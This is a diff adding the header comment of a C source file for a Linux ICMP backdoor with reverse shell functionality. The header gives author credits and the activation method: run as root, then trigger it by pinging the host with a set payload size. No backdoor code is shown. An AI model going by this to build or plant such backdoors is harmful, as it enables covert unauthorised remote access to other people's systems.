@@ -1,0 +1,17 @@
+/* 
+ * Linux backdoor using ICMP technique
+ * Coded by jamez - jamez#sekure.org (Sep 13, 1998)
+ * Reverse shell functionality added by Mihai Sbirneciu - mihai.sbirneciu#gmail.com (Nov 17, 2014)
+ * Special thanks to Alexander G. for bringing this gem to my attention.
+ * You must run the backdoor as root to be able to sniff ICMP:    
+ *  ./backdoor packet_size
+ *                  |
+ *                  `-> ICMP payload size required to activate the backdoor 
+ *  
+ *  To activate the backdoor: ping host -s packet_size
+ *  
+ * http://www.sekure.org
+ * http://speknet.tumblr.com/
+ * 
+ *
+ */
